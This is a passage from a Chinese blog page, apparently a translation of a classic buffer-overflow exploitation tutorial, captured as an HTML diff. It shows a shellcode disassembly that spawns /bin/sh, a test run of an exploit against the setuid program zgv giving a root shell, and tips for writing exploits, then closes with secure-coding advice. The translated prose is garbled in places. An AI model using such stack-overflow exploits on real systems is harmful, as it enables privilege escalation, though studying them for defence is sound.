] [SAVED EBP] [ORIGINAL RET]  </span><br><span class="line">   </span><br><span class="line">The execution thread of zgv is now as follows:  </span><br><span class="line">   </span><br><span class="line">main … -&gt; function() -&gt; strcpy(smallbuffer,getenv("HOME"));</span><br></pre></td></tr></table></figure>
+<p>此时，zgv做不到边界检查，写入超出了smallbuffer，返回到main的地址被栈中的返回地址覆盖。function()离不开/ ret和栈中EIP的指向。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xbffff574</span> nop</span><br><span class="line"><span class="number">0xbffff575</span> nop</span><br><span class="line"><span class="number">0xbffff576</span> nop</span><br><span class="line"><span class="number">0xbffff577</span> jmp $<span class="number">0</span>×<span class="number">24</span>                    <span class="number">1</span></span><br><span class="line"><span class="number">0xbffff579</span> popl %esi          <span class="number">3</span> &lt;–\    |</span><br><span class="line">[... shellcode starts here ...]    |    |</span><br><span class="line"><span class="number">0xbffff59b</span> call -$<span class="number">0x1c</span>             <span class="number">2</span> &lt;–/</span><br><span class="line"><span class="number">0xbffff59e</span> .<span class="built_in">string</span> <span class="string">"/bin/shX"</span> </span><br><span class="line">   </span><br><span class="line">Lets test the exploit…  </span><br><span class="line">   </span><br><span class="line"><span class="preprocessor"># cc -o zgx zgx.c  </span></span><br><span class="line"><span class="preprocessor"># ./zgx  </span></span><br><span class="line"><span class="keyword">using</span> address <span class="number">0xbffff574</span>  </span><br><span class="line">bash<span class="preprocessor">#</span></span><br></pre></td></tr></table></figure>
+<h4 id="5-2_编写攻击的进一步提示">5.2 编写攻击的进一步提示</h4><p>有很都可以被利用的程序，但还是很脆弱。但是这有很多的技巧，你可以通过过滤等方式得到。还有其他的溢出技术，这并不一定要包括改变返回地址或是只是放回地址。有指针溢出，函数分配的指针能够被覆盖通过一个数据流，改变程序执行的流程。攻击的返回地址指向shell环境指针，shellcode为与那里，而不是在栈上。</p>
+<p>对于一个熟练掌握shellcode的人是在根本上的自己修改代码，最初包含可以打印的，非白色的大写字母，然后修改自己它，把shellcode函数放在要执行的栈上。</p>
+<p>你应该永远不会有任何二进制0在你的shell代码里，因为如果它包含任何都可能无法正常的工作。但是本文讨论了怎么升华某种汇编指令与其他的命令超出了范围。我也建议读其他大的数据流怎么超出的，通过aleph1，Taeoh Oh和mudge来写的。</p>
+<h4 id="5-3_重要注意事项">5.3 重要注意事项</h4><p>你将不能在Windows 或是 Macintosh上使用这个教程，不要和我要cc.exe和gdb.exe。</p>
+<h4 id="6_结论">6 结论</h4><p>我们已经知道，一旦用户依赖存在的溢出，在90%的时间了是可以利用的，即使利用起来很困难，同时要一些技能。为什么写这个攻击很重要呢?因为软件企业是无知的。在软件缓冲区溢出方面的漏洞报告已经有了，虽然这些软件没有更新，或是大多数用户没有更新，因为这个漏洞很难被利用，没有人认为这会成为一个安全隐患。然后，漏洞出现了，证明和实践是程序能够利用，而且这就要急于更新了。</p>
+<p>作为程序员，写一个安全的程序是一个艰巨的任务，但是要认真的对待。在写入服务器时就变的更加值得关注，任何类型的安全程序，或是suid root的程序，或是设计使用root来运行，如特别的账户或是系统本身。使用范围检查，更喜欢分配动态缓冲器，输入的依赖性，大小，小心/while/etc。收集数据和填充缓冲区，以及一般处理用户很关心的输入的循环是我建议的主要原则。</p>
+<p>目前在安全行业取得了显著的成绩，使用非可执行的栈，suid包，防卫程序来核对返回值，边界核查编辑器等技术来阻止溢出问题。你应该在可以使用的情况下使用这些技术，但是不要完全依赖他们。如果你运行vanilla的UNIX的发行版时，不要假设安全，但是有溢出保护或是防火墙/IDS。它不能保证安全，如果你继续使用不安全的程序，因为<em>all</em>安全程序是<em>software</em>和包含自身漏洞的，至少他们不是完美的。如果你频繁的使用updates <em>和</em> security measures，你仍然不能渴望安全，<em>but</em>你可以希望。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2014/07/31/Android-WebView内存泄漏/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          Android WebView内存泄漏
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2014/06/14/如何成为一个偷懒又高效的Android开发人员/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">如何成为一个偷懒又高效的Android开发人员 </div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="share">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">分享到：</span>
+		<a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+		<a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="缓冲区溢出攻击" data-title="缓冲区溢出攻击" data-url="http://science09.github.io/2014/07/31/缓冲区溢出攻击/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"true"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2015 science09
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" type="text/css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js" type="text/javascript"></script>
+<script src="/js/main.js" type="text/javascript"></script>
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
 
   </div>
 </body>
-
 </html>
